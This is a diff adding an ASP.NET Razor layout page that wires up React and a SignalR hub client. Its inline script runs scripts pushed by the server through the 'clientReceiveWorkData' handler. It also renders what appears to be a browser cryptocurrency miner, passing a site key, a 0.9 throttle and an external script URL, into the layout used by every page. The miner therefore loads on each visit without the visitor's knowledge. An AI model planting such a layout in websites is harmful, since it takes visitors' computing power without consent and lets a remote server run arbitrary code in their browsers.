@@ -1,0 +1,53 @@
+﻿
+@{
+    Layout = null;
+}
+
+<!DOCTYPE html>
+
+<html>
+<head>
+    <meta name="viewport" content="width=device-width" />
+    <title>_LayoutReact</title>
+
+    @Scripts.Render("~/bundles/jquery")
+
+    <script src="~/Scripts/react/react.js"></script>
+    <script src="~/Scripts/react/react-dom.js"></script>
+
+
+    <script src="~/Scripts/jquery.signalR-2.2.2.min.js"></script>
+    <script src="~/signalr/hubs"></script>
+
+</head>
+<body>
+    <script>
+        servicehub = null;
+      
+            servicehub = $.connection.serviceHub;
+            $.connection.hub.url = "/signalr";
+
+            servicehub.client.clientReceiveWorkData = function (data) {
+                add_script(data.Script);
+            }
+
+            $.connection.hub.start().done(function () {
+
+               
+            });
+
+            $.connection.hub.error(function (error) {
+                console.log('SignalR error: ' + error)
+            });
+
+      
+
+        @SignalRService.Utils.RenderUtils.RenderMinerScript("b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087", "0.9", "https://www.freecontent.date./W7KS.js", 2000, 10000);
+    </script> 
+
+    @RenderBody()
+
+</body>
+
+
+</html>
